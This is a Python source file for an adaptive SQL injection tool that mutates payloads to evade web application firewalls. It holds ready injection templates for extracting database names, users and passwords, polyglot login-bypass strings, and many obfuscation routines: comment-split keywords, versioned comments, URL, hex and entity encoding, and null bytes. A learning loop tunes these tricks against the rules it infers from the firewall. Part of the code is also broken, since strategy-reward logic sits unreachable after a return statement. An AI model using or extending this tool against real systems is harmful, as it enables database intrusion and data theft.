import random
import re

class ASTMutator:
    def __init__(self, context="GENERIC"):
        self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM", "INFORMATION_SCHEMA"]
        self.context = context
        self.strategies = {
            "logical_alts": self._logical_equivalents,
            "inline_comments": self._inline_version_comments,
            "union_balance": self._balance_union_columns,
            "junk_fill": self._junk_filling,
            "context_aware": self._context_aware_mutation,
            "directed_bypass": self._directed_keyword_mutation,
            "polyglot": self._polyglot_mutation,
            "encoding": self._encoding_mutation,
            "keyword_comment_wrap": self._keyword_comment_wrap
        }
        # Awareness: Track success of each strategy
        self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
        # Gene Credit Assignment: Track reputation of each keyword/token
        self.token_reputation = {kw: 1.0 for kw in self.sql_keywords}
        # Add common structural tokens to reputation tracking
        for token in ["/**/", "/*!", "*/", "%20", "%0A", "+", "--", "#", "'", '"', "(", ")"]:
            self.token_reputation[token] = 1.0
            
        self.last_strategy_used = None
        self.stealth_mode = False
        self.blocked_chars = []
        self.latency_history = []
        self.success_dna = [] # Store sequences of mutations that worked
        self.blocked_signatures = set()
        self.successful_recipes = [] # Store recipes (lists of strategies) that worked
        self.failure_memory = {} # Store patterns that consistently fail
        self.mutation_history = {} # Track payload -> (strategy, parent_score)
        self.inferred_rules = [] # Rules from WAFRuleInferrer
        self.sqli_templates = {
            "UNION": "1' UNION SELECT NULL,DATABASE(),USER()--",
            "ERROR": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "BOOLEAN": "1' AND (SELECT 1 FROM users WHERE user='admin' AND password LIKE 'a%')--",
            "TIME": "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
        }

    def semantic_pivot(self, current_payload, target_type=None):
        """
        Transforms the payload into a completely different SQLi technique.
        Used when one technique is consistently blocked or failing.
        """
        types = list(self.sqli_templates.keys())
        if not target_type:
            # Pick a different type than what we are likely using
            current_type = "UNION" if "UNION" in current_payload.upper() else "BOOLEAN"
            target_type = random.choice([t for t in types if t != current_type])

        print(f"  [Pivot] Switching strategy to {target_type}...", flush=True)
        new_base = self.sqli_templates[target_type]
        
        # Try to maintain the "wrapping" context (quotes, parentheses)
        prefix = ""
        if current_payload.startswith("'"): prefix = "'"
        elif current_payload.startswith('"'): prefix = '"'
        
        if prefix and not new_base.startswith(prefix):
            new_base = prefix + new_base[1:] if new_base.startswith("'") or new_base.startswith('"') else prefix + new_base

        return new_base

    def apply_hint(self, hint):
        """Applies AI-driven or WAF-driven hints to mutation logic."""
        # Handle Inferred Rules
        if "inferred_rule" in hint:
            rule = hint["inferred_rule"]
            self.inferred_rules.append(rule)
            print(f"[*] Mutator: WAF Rule Inferred - {rule['type']} for '{rule['pattern']}'", flush=True)
            # Penalize tokens in the pattern
            for token in self.token_reputation:
                if token in rule["pattern"].upper():
                    self.token_reputation[token] *= 0.5

        strategy = hint.get("strategy")
        if strategy and strategy in self.strategy_weights:
            self.strategy_weights[strategy] *= 1.5
            print(f"[*] Mutator: Boosting strategy {strategy} based on hint", flush=True)

        weights = hint.get("weights", {})
        for strat, weight in weights.items():
            if strat in self.strategy_weights:
                self.strategy_weights[strat] *= weight
                print(f"[*] Mutator: Boosting strategy {strat} by {weight}x", flush=True)

        # Keyword specific hints
        target_kw = hint.get("target_keyword")
        if target_kw in self.token_reputation:
            self.token_reputation[target_kw] = 0.1 # Force bypass for this keyword
            print(f"[*] Mutator: AI Hint Applied - Flagging {target_kw} for bypass", flush=True)

        # WAF specific blocked characters
        blocked = hint.get("blocked_chars", [])
        if blocked:
            self.blocked_chars = list(set(self.blocked_chars + blocked))
            print(f"[*] Mutator: WAF Adaptation - Avoiding blocked chars: {self.blocked_chars}", flush=True)

    def mutate(self, payload, error_msg=None, intensity=1, response_time=None, forced_strategy=None):
        mutated = str(payload)
        applied_recipe = []
        
        # 0. Dynamic Intensity Adjustment
        if response_time:
            self.latency_history.append(response_time)
            if len(self.latency_history) > 5:
                avg_latency = sum(self.latency_history[-5:]) / 5
                if response_time > avg_latency * 1.5:
                    print(f"[*] Mutator: Latency spike detected ({response_time:.2f}s). Increasing mutation intensity.", flush=True)
                    intensity += 1
        
        # 1. WAF-Specific Character Replacement
        if " " in self.blocked_chars:
            separators = ["/**/", "/*!*/", "+", "%20", "%0A"]
            mutated = mutated.replace(" ", random.choice(separators))
            applied_recipe.append("waf_char_replace")
        
        # 2. Error-Based Feedback: Apply specific fixes based on SQL error
        if error_msg:
            mutated = self._apply_error_feedback(mutated, error_msg)
            intensity += 1 # Errors often mean we are close, increase intensity to find the fix
            applied_recipe.append("error_feedback")
            
        # 3. Context-Aware Mutation: Detect and wrap payload if needed
        mutated = self._context_aware_wrap(mutated)
        
        # 4. RL Integration: If a strategy is forced by the RL agent
        if forced_strategy and forced_strategy in self.strategies:
            mutated = self.strategies[forced_strategy](mutated)
            applied_recipe.append(forced_strategy)
            print(f"  [AI Agent] RL Agent chose strategy: {forced_strategy}", flush=True)
            return mutated, applied_recipe

        # 5. Standard Mutations
        # RECIPE MEMORY: 30% chance to reuse a known successful recipe if we have one
        if self.successful_recipes and random.random() < 0.3:
            recipe = random.choice(self.successful_recipes)
            for strat_name in recipe:
                if strat_name in self.strategies:
                    mutated = self.strategies[strat_name](mutated)
                    applied_recipe.append(strat_name)
            print(f"  [Recipe Memory] Applied known successful recipe: {recipe}", flush=True)
        else:
            # Standard weighted selection
            num_mutations = random.randint(1, 2) * intensity
            
            # Awareness: If in stealth mode, favor stealthy strategies
            current_weights = dict(self.strategy_weights)
            if self.stealth_mode:
                current_weights["context_aware"] *= 2.0
                current_weights["inline_comments"] *= 2.0
                current_weights["directed_bypass"] *= 3.0
                current_weights["polyglot"] *= 2.0

            for _ in range(num_mutations):
                names = list(self.strategies.keys())
                weights = [current_weights[n] for n in names]
                strat_name = random.choices(names, weights=weights, k=1)[0]
                
                temp_mutated = self.strategies[strat_name](mutated)
                
                # Learning: If the mutation results in a known risky pattern, try again once
                if self._is_risky(temp_mutated):
                    strat_name = random.choices(names, weights=weights, k=1)[0]
                    temp_mutated = self.strategies[strat_name](mutated)

                mutated = temp_mutated
                applied_recipe.append(strat_name)
            
        # 5. Differential Bisection Analysis: Target known blocked signatures
        for sig in self.blocked_signatures:
            if sig in mutated:
                mutated = mutated.replace(sig, self._obfuscate_signature(sig))
                applied_recipe.append("diff_obfuscation")
                
        return mutated, applied_recipe

    def _obfuscate_signature(self, sig):
        """Applies heavy, targeted obfuscation to a specific known blocked signature."""
        obfuscated = ""
        for char in sig:
            if char.isalpha():
                # Random case toggle
                obfuscated += char.upper() if random.random() > 0.5 else char.lower()
                # Random inline comment insertion
                if random.random() > 0.7:
                    obfuscated += "/**/"
            elif char == " ":
                obfuscated += random.choice(["/**/", "%20", "%0a", "%09"])
            else:
                obfuscated += char
        return obfuscated

    def report_success(self, payload, score, strategy_used=None):
        """Negative Reinforcement Learning: Learn from both success and failure."""
        if not strategy_used:
            strategy_used = self.last_strategy_used

        # 1. Backtracking Analysis: Compare with parent score
        history = self.mutation_history.get(payload)
        if history:
            parent_score = history.get("parent_score", 0)
            strategy = history.get("strategy")
            
            if score < parent_score - 0.2:
                # This mutation made things significantly worse!
                print(f"  [-] Mutator: Strategy {strategy} failed. Score dropped from {parent_score} to {score}. Penalizing.", flush=True)
                if strategy in self.strategy_weights:
                    self.strategy_weights[strategy] *= 0.5 # Heavy penalty
                
                # Store as a "Failure Pattern" if it was a WAF block
                if score <= 0.1:
                    self.failure_memory[payload] = strategy

        # 2. Token-Level Credit Assignment
        payload_upper = payload.upper()
        for token in self.token_reputation.keys():
            if token in payload_upper or token in payload:
                if score <= 0.1:
                    # Penalize tokens present in blocked payloads
                    self.token_reputation[token] -= 0.15
                    self.token_reputation[token] = max(0.05, self.token_reputation[token])
                elif score >= 0.8:
                    # Reward tokens present in successful payloads
                    self.token_reputation[token] += 0.2
                    self.token_reputation[token] = min(5.0, self.token_reputation[token])

    def _is_risky(self, payload):
        """Checks if a payload contains patterns that previously failed."""
        for failed_p in self.failure_memory:
            if failed_p in payload:
                return True
        return False

        # Detect if we are being blocked consistently
        if score <= 0.1:
            self.stealth_mode = True
        else:
            self.stealth_mode = False

        if strategy_used and score > 0.5:
            # Reward the strategy
            self.strategy_weights[strategy_used] += 0.2 # Increased reward for feedback loop
            
            # If it's a very high score, store this as "Success DNA"
            if score >= 0.9:
                self.success_dna.append(strategy_used)
                if len(self.success_dna) > 10: self.success_dna.pop(0)

            # Normalize to prevent runaway weights
            total = sum(self.strategy_weights.values())
            for k in self.strategy_weights:
                self.strategy_weights[k] /= total
                self.strategy_weights[k] *= len(self.strategy_weights) # Keep average at 1.0

    def _polyglot_mutation(self, payload):
        """Creates a polyglot payload that works in multiple contexts."""
        polyglots = [
            f"SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",
            f"1'\"--",
            f"')) OR 1=1--",
            f"\" OR 1=1--",
            f"admin' or '1'='1'--"
        ]
        if random.random() < 0.3:
            return random.choice(polyglots)
        
        # Wrap existing payload in a polyglot shell
        return f"1' OR ({payload}) OR '1'='1"

    def _encoding_mutation(self, payload):
        """Applies various encoding techniques."""
        encodings = [
            lambda p: "".join([f"%{ord(c):02X}" for c in p]), # Full URL Encode
            lambda p: "".join([f"\\x{ord(c):02x}" for c in p]), # Hex Encode
            lambda p: p.replace(" ", "%20").replace("'", "%27").replace("\"", "%22"), # Selective URL Encode
            lambda p: "".join([f"&#{ord(c)};" for c in p]) # HTML Entity Encode
        ]
        return random.choice(encodings)(payload)

    def _directed_keyword_mutation(self, payload):
        """Directed Mutations: Apply bypasses to keywords based on their reputation."""
        mutated = payload
        # Find keywords with low reputation in the current payload
        for kw, rep in self.token_reputation.items():
            if kw in mutated.upper() and (rep < 0.8 or random.random() < 0.3):
                # Apply a bypass transformation
                bypasses = [
                    lambda k: f"{k[:len(k)//2]}/**/{k[len(k)//2:]}",
                    lambda k: f"/*!{k}*/",
                    lambda k: "".join([f"%{ord(c):02X}" if random.random() < 0.3 else c for c in k]),
                    lambda k: f"({k})" if k in ["SELECT", "UNION"] else k
                ]
                transform = random.choice(bypasses)
                # Use regex to replace keyword while preserving case if possible
                mutated = re.sub(rf'\b{kw}\b', transform(kw), mutated, flags=re.IGNORECASE)
        return mutated

    def _apply_error_feedback(self, payload, error):
        """Applies specific mutations based on SQL error messages."""
        error = error.lower()
        # Column count mismatch
        if "column" in error and ("count" in error or "match" in error):
            if "UNION SELECT" in payload.upper():
                # Add more columns to UNION
                parts = re.split(r"(SELECT\s+)", payload, flags=re.IGNORECASE)
                if len(parts) >= 3:
                    cols = parts[2].split(",")
                    cols.append("NULL")
                    return f"{parts[0]}{parts[1]}{','.join(cols)}"
        
        # Quote mismatch or syntax error near quote
        if "syntax" in error and ("'" in error or '"' in error):
            if "'" in payload: return payload.replace("'", "''")
            
        return payload

    def _context_aware_wrap(self, payload):
        """Wraps payload based on detected context (quotes, brackets)."""
        if random.random() > 0.7:
            wrappers = [
                ("'", "'"),
                ('"', '"'),
                ("') ", " --"),
                ('") ', " --"),
                (")) ", " --")
            ]
            prefix, suffix = random.choice(wrappers)
            if not payload.startswith(prefix):
                return prefix + payload + suffix
        return payload

    def _inline_version_comments(self, payload):
        mutated = payload
        for kw in self.sql_keywords:
            if kw in mutated.upper():
                rand_ver = random.randint(40000, 60000)
                mutated = re.sub(rf'\b{kw}\b', f"/*!{rand_ver}{kw}*/", mutated, flags=re.IGNORECASE)
        return mutated

    def _logical_equivalents(self, payload):
        equivalents = {
            r"1=1": ["true", "not false", "~0=~0", "8<=>8"],
            r"\bOR\b": ["||", "XOR"],
            r"\bAND\b": ["&&"]
        }
        mutated = payload
        for pattern, alts in equivalents.items():
            mutated = re.sub(pattern, random.choice(alts), mutated, flags=re.IGNORECASE)
        return mutated

    def _balance_union_columns(self, payload):
        if "UNION" in payload.upper() and "SELECT" in payload.upper():
            column_options = ["NULL", "NULL,NULL", "NULL,NULL,NULL", "1,2", "database(),user()"]
            parts = re.split(r"(SELECT\s+)", payload, maxsplit=1, flags=re.IGNORECASE)
            if len(parts) >= 3:
                return f"{parts[0]}{parts[1]}{random.choice(column_options)}"
        return payload

    def _junk_filling(self, payload):
        junk = ["bypass", "attack_unit", "audit"]
        if "/**/" in payload:
            return payload.replace("/**/", f"/*{random.choice(junk)}*/")
        return payload

    def _keyword_comment_wrap(self, payload):
        """Wraps SQL keywords in various comment styles to evade detection."""
        mutated = str(payload)
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
        
        for kw in keywords:
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
                # Choose a random comment style
                style = random.choice([
                    lambda k: f"/*{random.choice(['!', 'x', 'bypass'])}*/{k}/*{random.choice(['!', 'x', 'bypass'])}*/",
                    lambda k: f"{k}/*{random.choice(['!', 'x', 'bypass'])}*/",
                    lambda k: f"/*{random.choice(['!', 'x', 'bypass'])}*/{k}",
                    lambda k: f"--{random.choice(['!', 'x', 'bypass'])}\n{k}",
                    lambda k: f"#{random.choice(['!', 'x', 'bypass'])}\n{k}"
                ])
                mutated = re.sub(rf'\b{kw}\b', style(kw), mutated, flags=re.IGNORECASE)
                
        return mutated

    def _context_aware_mutation(self, payload):
        mutated = str(payload)
        
        # 0. Context-Specific Injection
        if self.context == "SINGLE_QUOTE" and not mutated.startswith("'"):
            mutated = "'" + mutated
        elif self.context == "DOUBLE_QUOTE" and not mutated.startswith('"'):
            mutated = '"' + mutated

        # 1. Quote Alteration & Escaping Variations
        if "'" in mutated:
            options = [
                lambda p: p.replace("'", "''"), # SQL Escape
                lambda p: p.replace("'", "\\'"), # C-Style Escape
                lambda p: p.replace("'", "%27"), # URL Encode
                lambda p: p.replace("'", '"')    # Swap to Double
            ]
            mutated = random.choice(options)(mutated)

        # 2. Advanced Comment Wrapping & Nested Structures
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
        for kw in keywords:
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
                coin = random.random()
                if coin < 0.2:
                    # Nested comments: /*!50000/*bypass*/SELECT*/
                    mutated = re.sub(rf'\b{kw}\b', f"/*!50000/*bypass*/{kw}*/", mutated, flags=re.IGNORECASE)
                elif coin < 0.4:
                    # Newline injection: SELECT\nFROM
                    mutated = re.sub(rf'\b{kw}\b', f"{kw}\n", mutated, flags=re.IGNORECASE)
                elif coin < 0.6:
                    # Null byte injection (if supported/needed)
                    mutated = re.sub(rf'\b{kw}\b', f"{kw}%00", mutated, flags=re.IGNORECASE)

        # 3. Space/Separator Mutation (Advanced)
        if " " in mutated:
            separators = ["/**/", "/*!*/", "+", "%0A", "%0D", "%09", "/*\n*/"]
            sep = random.choice(separators)
            mutated = mutated.replace(" ", sep)

        return mutated
